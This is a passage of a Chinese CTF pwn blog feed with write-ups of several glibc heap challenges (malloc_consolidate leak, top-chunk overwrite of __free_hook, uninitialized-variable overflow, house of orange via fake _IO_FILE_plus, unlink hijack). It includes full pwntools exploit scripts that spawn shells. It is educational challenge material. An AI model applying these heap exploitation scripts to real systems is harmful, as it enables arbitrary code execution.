漏洞利用地址泄露在_int_free函数中，会对要释放的chunk的size做检查，检查发生在已经与前后块合并完成之后： 12345if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av))malloc_consolidate(av); ……&#125; 如果size大于设定的阈值，就会对fastbin进行合并（malloc_consolidate）。合并之后的块会放入到unsorted bin中（具体可以查看malloc_consolidate的源码），这时候将有机会利用unsorted bin泄露libc地址。 由于本题只对小于0x80的内存进行free，而且释放fastbin大小的块时是不会走到malloc_consolidate这一步的，所以可以通过malloc(0x7f)来触发malloc_consolidate：实际会分配0x90大小，属于small bin，释放的时候会与top合并，此时由于size大于阈值，由此触发fastbin合并操作。所以在0x7f之前再申请几块fastbin的内存。 注：fastbin的块即使在释放之后，P位也不会置0，在malloc_consolidate才会置0。 如果分别申请0x20和0x30，在合并之前它们分别呆在不同的fastbins里，然后执行malloc_consolidate： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556maxfb = &amp;fastbin (av, NFASTBINS - 1);fb = &amp;fastbin (av, 0);do &#123; p = atomic_exchange_acq (fb, 0); if (p != 0) &#123; do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd; size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); //根据size找到下一块及大小 nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); //如果前一块是空闲块，合并 if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; //下一块不是top if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //下一块时空闲块，合并 if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else//下一块不是空闲块，将下一块中记录本块是否空闲的P位置0 clear_inuse_bit_at_offset(nextchunk, 0); //将p放入到unsorted bin当中 first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; //下一块是top，合并 else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); &#125; &#125; while (fb++ != maxfb); &#125; 即0x20（实际0x30）的块先放入unsorted bin，此时它的fd和bk已经写好，然后0x30（实际0x40）的块先与0x20的块合并，然后又与后面的top合并，原来0x20的头变为top头。 此后再分配一块内存并写入前8字节，就能读取到原来0x20的bk指针了，由此泄露地址。 劫持执行流参考Ne0出题人大佬的wp，用到了一个神奇的方法：事先写好一个字段作为top的大小，值为：free_hook-top_addr + system_addr，然后再从top分出free_hook-top_addr （大概为这个值）大小，并添加一些偏移，使得分配之后的top头中size字段正好能落在free_hook上，即将system_addr写入到free_hook。 之前在主分配区泄露了libc的地址，同样，我们也能泄露切换之后的分配区的top地址。由于非主分配区的malloc_state不会像主分配区的malloc_state一样存放在libc里，而是在非主分配区的堆中，所以泄露地址时bk记录的是unsorted bin的地址，也就是实际内容-0x10处，而这个位置恰好是记录top地址的字段，由于都是在堆上，便可以由偏移计算出top的地址。 12345678910111213[*] new_ub:0x7f7168000078 #泄露出的地址……pwndbg&gt; x/8gx 0x7f71680000780x7f7168000078: 0x00007f71680008e0 0x0000000000000000 #0x00007f71680008e0就是top的地址0x7f7168000088: 0x00007f7168000078 0x00007f7168000078 #ub的FD和BK0x7f7168000098: 0x00007f7168000088 0x00007f71680000880x7f71680000a8: 0x00007f7168000098 0x00007f7168000098pwndbg&gt; x/8gx 0x00007f71680008e0 #新的top0x7f71680008e0: 0x0000000000000000 0x00000000000207210x7f71680008f0: 0x0000000000000000 0x00000000000000000x7f7168000900: 0x0000000000000050 0x00000000000000440x7f7168000910: 0x0000000000000000 0x0000000000000000 这个header的前八个字节恰好是记录top的地址，而实际上这个header是不存在的，这里画出来是便于理解。 上面提到的事先写好一个字段为top的大小，然后是要通过malloc的漏洞，向某处写一个0。这个某处就可以是top的地址处，这样能让top向前提升几个字节，提升后能使top的大小正好为free_hook-top_addr + system_addr，之后再次malloc就会从修改后的top处分配内存，完成将system的地址写入到free_hook中。这里需要对写入的内容加入一些偏移，使得top的size字段对应于free_hook。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *import timecontext.log_level='debug'p=process('./noend')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def routine(size,content): p.sendline(str(size)) time.sleep(0.3) p.send(content) p.recvuntil(content)routine(0x20,'0gur0')#0routine(0x30,'0gur1')#1routine(0x7f,'0gur2')#2routine(0x20,'0'*8)#泄露地址data = u64(p.recv()[:8])offset = 0x7f7c2d6dbb78-0x7f7c2d317000libc_base = data -offsetsys_addr = libc_base + libc.symbols['system']log.info('sys_addr:%#x '%sys_addr)#发送一个很大的size，从而切换到非主分配区p.sendline(str(libc_base+libc.symbols['__malloc_hook']))time.sleep(0.3)p.sendline()p.recvline()p.clean()#泄露非主分配区记录top字段的地址routine(0x20,'0gur0')#0routine(0x30,'0gur1')#1routine(0x7f,'0gur2')#2routine(0x20,'0'*8)new_ub = u64(p.recv()[:8])log.info('new_ub:%#x '%new_ub)#其中new_ub+0x868对应于top的地址，注意new_top是记录这个值的地址#+0x20是在top提升之后对应的地址#-0x8是考虑到malloc时会向16对齐的问题routine(0xf0,p64(sys_addr+libc_base+libc.symbols['__free_hook']-(new_ub+0x868+0x20)-0x8)*(0xf0/8))p.sendline(str(new_ub+1))time.sleep(0.3)p.sendline()p.recvline()p.clean()#设libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)为offset，即当前top与free_hook之间的偏移为offset#则上一步将top的size写成offset-8+sys_addr，此处分配了offset-16的大小#在调试时查看到offset是以8结尾的，则malloc（offset-16），会进行（offset-16+8)对16向上取整，即实际分配offset-8大小的内存，则top的size恰好就变为sys_addr，而分配了offset-8之后，top地址正好挪到了free_hook-8处，则size正好写在了free_hook处routine(libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x10,'a'*8)routine(0x10,'/bin/sh')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[青岛链湾杯--note]]></title>
    <url>%2F2018%2F06%2F27%2F%E9%9D%92%E5%B2%9B%E9%93%BE%E6%B9%BE%E6%9D%AF-note%2F</url>
    <content type="text"><![CDATA[废话：第一次打线下赛，确实很慌，该想到的东西都忘了，果然还是得多加练习啊QWQ 基本逻辑菜单类小游戏：add，edit，show，delete，copy add：添加结点，此处能够了解结点的结构 edit函数对结点的content进行编辑，但是这里的v3，v4，v1都没有进行初始化或者置零，将是本题的关键。 show函数，展示结点的content以及title。这个print函数是写在bss段的一个地址，通过调试发现写入的就是puts函数地址。 copy函数，malloc出某结点size大小的块N次，N为用户输入。 漏洞利用所有结点的地址以数组元素的形式存在于bss段中的s1[]中。前面已经说到了，在edit函数里，对存放size，content地址和结点地址的变量v1，v4和v3都没有进行初始化。发现这个问题的契机在于，当第二次edit某个结点content时，随意输入title都会提示“plz input new content”。没有初始化的后果就是，由于这些函数都会共用一块栈空间，比如show中的v3和edit中的v3地址都是ebp-0x120，v4都是ebp-0x118，导致当在show之后，v3和v4的值为刚刚操作过的结点的地址和content地址，而进入到edit函数中后即使输入的title没有匹配，也会执行向v4中写入v1个字节的操作，如果v4和v1不是同一结点的两个参数，那么就会导致溢出。 例如：v1为s1[1]中的size，而v3和v4是s1[0]中的参数，edit就会向v4中写入v1个字节，当v1大于s1[0]的size时，会造成溢出。溢出后就可以修改s1[0]中content的地址，之后再edit时就相当于向被修改的地址中写入内容。这里先把content0地址修改为print的地址，edit时向print的位置写入system@plt，再次show的时候就相当于执行system。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level='debug'p=process('./note')def add(size,content,title): p.recvuntil('input choice:\n') p.sendline('1') p.recvuntil('input content size\n') p.sendline(str(size)) p.recvuntil('input content\n') p.sendline(content) p.recvuntil('input note title\n') p.sendline(title)def edit(title,content): p.recvuntil('input choice:\n') p.sendline('2') p.recvuntil('plz input title\n') p.sendline(title) p.recvuntil('plz input new content\n') p.sendline(content)def show(title): p.recvuntil('input choice:\n') p.sendline('3') p.recvuntil('plz input title\n') p.sendline(title)def copy(title,num): p.recvuntil('input choice:\n') p.sendline('5') p.recvuntil('plz input title\n') p.sendline(title) p.recvuntil('how many times do you want\n') p.sendline(str(num))p.recvuntil('plz input your name\n')p.sendline('')print_addr = 0x602100sys_plt = 0x400860#0add(128,"0gur0","0")#1add(256,"0gur1","1")#2add(256,"/bin/sh","/bin/sh")#edit 1 v1=256edit("1","new 0gur1")#show 0 v3=s[0] v4=s[0].contentshow("0")#edit content0's addrpayload ='a'*128#content0payload +=p64(0)+p64(0x35) #node0 chunk headerpayload+=p64(48)+p64(0)+p64(128)+p64(print_addr) #node0edit("hhh",payload)#edit 0edit("0",p64(sys_plt))#show:print-&gt;systemshow('/bin/sh')p.interactive() PS：一个还没有解决的问题，malloc按理说应该是在堆上进行分配的，但是本题查看分配的地址，都是以0x7f开头的，比较像栈上的地址，而且即使分配了多个块，top chunk的大小都不变…]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-note]]></title>
    <url>%2F2018%2F06%2F05%2Fsuctf2018-note%2F</url>
    <content type="text"><![CDATA[house of orange – note基础知识 unsorted bin的解链操作没有类似于malloc中p-&gt;fd-&gt;bk == p的检查 small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一个位置，fastbin有自己的位置，small bins位于bins数组中。当释放的内存在64B以下时，会直接放入fastbin中；unsorted bin中的chunk最终会放入到small bins中。 house of orange(堆地址未知的情况) 这里省去了修改top大小的部分，修改top大小是为了重新分配一个top，把旧top放入到unsorted bin中，以利用unsorted bin的各种攻击。适用于没有unsorted bin的情况下，如果程序中有unsorted bin，可以省略这部分。 house of orange的原理是，调用malloc时，利用unsorted bin中错误的FD/BK指针，触发malloc_printerr函数打印错误信息，malloc_printerr调用__libc_message，_libc_message调用abort()，abort()调用_IO_flush_all_lockp。在_IO_flush_all_lockp中，通过对链表结构_IO_list_all中的每个结点进行遍历，找到符合条件的结点，执行_IO_OVERWRITE函数，其中结点是_IO_FILE_PLUS类型的结构体，对函数的查找需要通过vtable定位函数表。 通过代码来具体查看，malloc_printerr用于打印错误信息，位于malloc.c中： 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; ​ 在__libc_message中会调用absort（）： 123456789101112131415161718192021/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123; va_list ap; int fd = -1; va_start (ap, fmt); …… va_end (ap); if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort (); &#125;&#125; abort()中调用_IO_flush_all_lockp()，在调用之前先define为fflush： 12345678910111213141516171819202122232425262728293031323334#define fflush(s) _IO_flush_all_lockp (0) ……voidabort (void)&#123; struct sigaction act; sigset_t sigs; /* First acquire the lock. */ __libc_lock_lock_recursive (lock); /* Now it's for sure we are alone. But recursive calls are possible. */ /* Unlock SIGABRT. */ if (stage == 0) &#123; ++stage; if (__sigemptyset (&amp;sigs) == 0 &amp;&amp; __sigaddset (&amp;sigs, SIGABRT) == 0) __sigprocmask (SIG_UNBLOCK, &amp;sigs, (sigset_t *) NULL); &#125; /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; //_IO_flush_all_lockp() fflush (NULL); &#125; ……&#125; 离底层越来越近了…… _IO_flush_all_lockp()获取了_IO_list_all链表，对每一个结点进行处理： 12345678910111213141516171819202122232425262728int_IO_flush_all_lockp (int do_lock)&#123; int result = 0; struct _IO_FILE *fp; int last_stamp;#ifdef _IO_MTSAFE_IO __libc_cleanup_region_start (do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock (list_all_lock);#endif last_stamp = _IO_list_all_stamp; //获取_IO_list_all fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); //先对_IO_FILE中的mode,_IO_write,_IO_write_base等检查，满足条件才执行_IO_OVERFLOW if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base)) #endif)&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)result = EOF; if (do_lock)_IO_funlockfile (fp);run_fp = NULL; if (last_stamp != _IO_list_all_stamp){/ Something was added to the list. Start all over again. /fp = (_IO_FILE *) _IO_list_all;last_stamp = _IO_list_all_stamp;}else//循环是通过每个结点的chain字段fp = fp-&gt;_chain;} #ifdef _IO_MTSAFE_IOif (do_lock)_IO_lock_unlock (list_all_lock);__libc_cleanup_region_end (0);#endif return result;} 12345678910111213其中，确定`_IO_list_all`中结点的结构体为`_IO_FILE_plus`:![_IO_list_all链表的结点类型](suctf2018-note/iolistall.png)`_IO_FILE_plus`的结构，即一个`_IO_FILE`结构和一个虚表指针`vtable`：```cstruct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; _IO_FILE结构如下，其中chain是用于记录下一结点的位置的： 继续看_IO_flush_all_lockp，在if处对结点中各字段进行检查，当满足条件时，会执行_IO_OVERFLOW，函数的寻址是通过查寻vtable实现的。vtable的结构如下，第四行即为_IO_OVERFLOW的地址： 12345678910111213141516171819202122232425struct _IO_jump_t289 &#123;290 JUMP_FIELD(size_t, __dummy);291 JUMP_FIELD(size_t, __dummy2);292 JUMP_FIELD(_IO_finish_t, __finish);293 JUMP_FIELD(_IO_overflow_t, __overflow);294 JUMP_FIELD(_IO_underflow_t, __underflow);295 JUMP_FIELD(_IO_underflow_t, __uflow);296 JUMP_FIELD(_IO_pbackfail_t, __pbackfail);297 /* showmany */298 JUMP_FIELD(_IO_xsputn_t, __xsputn);299 JUMP_FIELD(_IO_xsgetn_t, __xsgetn);300 JUMP_FIELD(_IO_seekoff_t, __seekoff);301 JUMP_FIELD(_IO_seekpos_t, __seekpos);302 JUMP_FIELD(_IO_setbuf_t, __setbuf);303 JUMP_FIELD(_IO_sync_t, __sync);304 JUMP_FIELD(_IO_doallocate_t, __doallocate);305 JUMP_FIELD(_IO_read_t, __read);306 JUMP_FIELD(_IO_write_t, __write);307 JUMP_FIELD(_IO_seek_t, __seek);308 JUMP_FIELD(_IO_close_t, __close);309 JUMP_FIELD(_IO_stat_t, __stat);310 JUMP_FIELD(_IO_showmanyc_t, __showmanyc);311 JUMP_FIELD(_IO_imbue_t, __imbue);312 &#125;; 按照simp1e大佬的说法，2.24版本的glibc在执行_IO_OVERFLOW之前还有一个对vtable的检查函数：_IO_check_vtable，他的思路是利用已有的vtable而不是我们自己伪造的vtable，这样很容易过check。实际上也确实有这样的vtable结构：_IO_str_jumps，它就是vtable类型的结构体，因此_IO_OVERFLOW的位置对应于_IO_str_overflow（第三行） 1234567891011121314151617181920212223const struct _IO_jump_t _IO_str_jumps libio_vtable =356 &#123;357 JUMP_INIT_DUMMY,358 JUMP_INIT(finish, _IO_str_finish),359 JUMP_INIT(overflow, _IO_str_overflow),360 JUMP_INIT(underflow, _IO_str_underflow),361 JUMP_INIT(uflow, _IO_default_uflow),362 JUMP_INIT(pbackfail, _IO_str_pbackfail),363 JUMP_INIT(xsputn, _IO_default_xsputn),364 JUMP_INIT(xsgetn, _IO_default_xsgetn),365 JUMP_INIT(seekoff, _IO_str_seekoff),366 JUMP_INIT(seekpos, _IO_default_seekpos),367 JUMP_INIT(setbuf, _IO_default_setbuf),368 JUMP_INIT(sync, _IO_default_sync),369 JUMP_INIT(doallocate, _IO_default_doallocate),370 JUMP_INIT(read, _IO_default_read),371 JUMP_INIT(write, _IO_default_write),372 JUMP_INIT(seek, _IO_default_seek),373 JUMP_INIT(close, _IO_default_close),374 JUMP_INIT(stat, _IO_default_stat),375 JUMP_INIT(showmanyc, _IO_default_showmanyc),376 JUMP_INIT(imbue, _IO_default_imbue)377 &#125;; 如果我们能够控制_IO_str_overflow的地址，就能执行system函数了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859_IO_str_overflow (FILE *fp, int c)82 &#123;83 int flush_only = c == EOF;84 size_t pos;85 if (fp-&gt;_flags &amp; _IO_NO_WRITES)86 return flush_only ? 0 : EOF;87 if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))88 &#123;89 fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;90 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;91 fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;92 &#125;93 pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;94 if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))95 &#123;96 if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */97 return EOF;98 else99 &#123;100 char *new_buf;101 char *old_buf = fp-&gt;_IO_buf_base;102 size_t old_blen = _IO_blen (fp);103 size_t new_size = 2 * old_blen + 100;104 if (new_size &lt; old_blen)105 return EOF; //这里有一个相对地址的调用，函数地址是fp的某地址，参数为new_size.106 new_buf107 = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);108 if (new_buf == NULL)109 &#123;110 /* __ferror(fp) = 1; */111 return EOF;112 &#125;113 if (old_buf)114 &#123;115 memcpy (new_buf, old_buf, old_blen);116 (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);117 /* Make sure _IO_setb won't try to delete _IO_buf_base. */118 fp-&gt;_IO_buf_base = NULL;119 &#125;120 memset (new_buf + old_blen, '\0', new_size - old_blen);121 122 _IO_setb (fp, new_buf, new_buf + new_size, 1);123 fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);124 fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);125 fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);126 fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);127 128 fp-&gt;_IO_write_base = new_buf;129 fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;130 &#125;131 &#125;132 133 if (!flush_only)134 *fp-&gt;_IO_write_ptr++ = (unsigned char) c;135 if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)136 fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;137 return c;138 &#125; 通过IDA查看libc，找到_IO_str_overflow，可以看到，a1是_IO_str_overflow的第一个参数，即fp；要执行的函数偏移为fp+224，参数为v7。可以考虑把fp+224写为system的地址，v7写为/bin/sh的地址；v6就等于(v7-100)/2，而v6又是*(fp+64)-v5，v5= *(fp+56)，这样我们可以自己构造一个_IO_FILE_plus结构，然后在64和56偏移处放入v6和v5，并把vtable的地址设置为_IO_str_jumps结构体的地址。 总结一下，在malloc_printerr中函数的调用关系如下： 举例分析–SUCTF2018 NOTE基本逻辑依旧是菜单类的小游戏，有三个功能：添加、展示和删除。 在游戏开始之前，先对ptr进行了初始化。ptr是位于bss段的一个指针数组，在ptr[0]中写入了：Hello,Welcome to SUCTF,I letf something here! add函数找到ptr中第一个为空的位置，分配size大小的空间，并输入内容，此处没有对输入内容的大小做限制。 show函数通过索引找到对应内存，输出内容。 dele函数会释放ptr[0]和qword_2020c8中存放地址对应的内存。 漏洞利用在add中，对输入的内容长度未做限制，会造成堆溢出漏洞。利用堆溢出漏洞，可以构造出上述的_IO_FILE_plus结构。 首先，泄露system地址，还是常用的UAF，当dele释放之后，通过读取unsortedbin的FD指针，计算出libc的地址。 然后，为了能够执行构造的_IO_FILE_plus结构中vtable的_IO_OVERFLOW，要对_IO_list_all进行劫持，即在_IO_flush_all_lockp函数中对_IO_list_all的每一个结点进行遍历时，要让它检查我们伪造的结点。因此考虑用unsorted bin attack，使解链操作时，*_IO_list_all = unsorted_chunk(av)，即第一个结点位于unsorted bin的头部，这样，chain对应的位置恰好为第六个small bins头的位置。我们可以想办法把伪造的_IO_FILE_plus放在第六个small bins对应的大小里，即0x60。 采用的方法是，通过堆溢出修改下一个位于unsorted bin 的chunk大小为0x61，在这个chunk里存放伪造的_IO_FILE_plus。此时再分配一个大于0x200大小的内存，由于unsorted bin中的块不能满足要求，则会先将这个块放入对应大小的small bins里，然后再查找下一块。查找下一块时由于unsorted bin attack已经破坏了chunk的BK，由此就会触发malloc_printerr函数，遍历_IO_list_all，第一个结点已经转移unsorted bin上，但不满足条件，于是通过chain字段找到下一个结点，也就是我们伪造的结点，最终能够执行system。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677 from pwn import *#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;context.log_level='debug'debug=1if debug: p = process('./note') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,"b _IO_str_overflow")else : libc = ELF('./libc6_2.24-12ubuntu1_amd64.so') p = remote('pwn.suctf.asuri.org',20003)def add(size,content): p.recvuntil('Choice&gt;&gt;') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Content:') p.sendline(content)def show(index): p.recvuntil('Choice&gt;&gt;') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(): p.recvuntil('Choice&gt;&gt;') p.sendline('3') p.recvuntil('(yes:1)') p.sendline('1')add(16,'1'*16)#2#leak system addressdele()show(0)p.recvuntil('Content:')libc_addr = u64(p.recv(6)+'\x00\x00')offset = 0x7f1b15e2ab78-0x7f1b15a66000libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']sys_addr = libc_base+libc.symbols['system']malloc_hook = libc_base+libc.symbols['__malloc_hook']io_list_all = libc_base+libc.symbols['_IO_list_all']binsh_addr = libc_base+next(libc.search('/bin/sh'))+5log.info('sys_addr:%#x' %sys_addr)#unsorted bin attack fake_chunk = p64(0x8002)+p64(0x61) #headerfake_chunk += p64(0xddaa)+p64(io_list_all-0x10)#fake IO_FILE_PLUSfake_IFP = p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)fake_IFP = fake_IFP.ljust(0x80,'\x00')fake_IFP += p64(sys_addr+0x420)fake_IFP = fake_IFP.ljust(0xa0,'\x00')fake_IFP += p64(0)vtable_addr = malloc_hook-0x1370#+libc.symbols['_IO_str_jumps']fake_IFP += p64(0)fake_IFP += p64(0)fake_IFP += p64(vtable_addr)fake_IFP += p64(sys_addr)fake_IFP += p64(2)fake_IFP += p64(3) fake_IFP += p64(0)*3 payload = 'a'*16 +fake_chunk+fake_IFPpayload += p64(sys_addr)add(16,payload)#3#add a large chunkp.recvuntil('Choice&gt;&gt;')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x200))p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitbctf2018-once]]></title>
    <url>%2F2018%2F06%2F05%2Fhitbctf2018-once%2F</url>
    <content type="text"><![CDATA[once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的，果然要多读源码。 f2：在bss段有一个变量dword_202064，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。 f3：同样，bss有一个dword_202060变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。 f4：函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。 ​ 输入2时，向ptr内输入size大小的内容。 ​ 输入3时，释放ptr内存。 漏洞及利用在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称offset_202038为first,unk_202020为head： 123456//f2向结点内写内容，覆盖node[3]的地址为addr//first里记录的是node的地址first = *(first+3)//first = addr *(first+2)=&amp;head//*(addr+2)=&amp;head 可以看出，最终能够实现向addr+16的地址处写入head地址。由于f4后续可以操作ptr变量，就使得addr+16=&amp;ptr，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。 本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。addr = &amp;ptr-16 = 0x202058，发送最后一个字节0x58即可。 之后f4向ptr写入内容就相当于向unk_202020起始的位置写入内容。由于f2能够向off_202038中的地址写入内容，不妨将offset_202038的值写为 __free_hook的地址，之后调用f2就可以向这里写入system地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 __free_hook之后，再次调用free就会执行system，f4中的3调用了free函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为/bin/sh的地址。 一共要进行三次写操作： 1.f2向offset_202038中写入24字节填充和1字节0x58覆盖后向指针 2.f4-2向ptr中写入__free_hook地址、/bin/sh地址和对一些标识位置位。 3.f2向offset_202038（__free_hook）写入system地址 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *debug = 1elf = ELF('./once')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = process('./once') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('47.75.189.102', 9999) libc = ELF('./libc-2.23.so') context.log_level = 'debug'def fun_1(): p.recvuntil('&gt; ') p.sendline('1')def fun_2(string): p.recvuntil('&gt; ') p.sendline('2') p.sendline(string)def fun_3(): p.recvuntil('&gt; ') p.sendline('3')#leak libcp.recvuntil('&gt;')p.sendline('0')p.recvuntil('Invalid choice\n')libc.address = int(p.recvuntil('&gt;')[:-1],16)-libc.symbols['puts']#add a nodefun_1()#f4:ptr=malloc 0xe0p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('size:')p.sendline(str(0xe0))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')#input node fun_2('a'*16+'b'*8 + chr(0x58))#remove nodefun_3()#write ptrp.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send(p64(libc.symbols['system']))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('3')print '[*] system ',hex(libc.symbols['system'])p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastbin_attack-search]]></title>
    <url>%2F2018%2F06%2F05%2Ffastbin-attack-search%2F</url>
    <content type="text"><![CDATA[fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。 在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。 fastbin劫持的原理fastbin劫持的原理是，在双重释放之后，fastbin上会有两个相同的chunk，当其中一个chunk被分配并能够进行写操作时，另一个留在fastbin链表里的chunk对应的内容也会发生改变，通过覆写FD指针，将链表中的下一个结点指向我们可以操控的地方。需要注意的是，fastbin再分配之前会先检查当前这个chunk的大小是否与申请的大小一致，因此伪造的fastbin chunk的size字段必须满足条件。 了解了原理之后再看search engine这道题。 search engine基本逻辑一个简单的搜索引擎，index a sentence输入一个句子，单词用空格作为分隔，每个单词放入一个结点中，记录单词的地址、大小以及所在句子的地址、大小，最后一个字段记录下一个结点的地址。单词链表类似于一个栈的结构，最后分隔的单词在链表的最顶端。一个node结点占40字节。 123456789struct node&#123; char * word; //8 bytes int word_size; //4 bytes int word_padding; //4 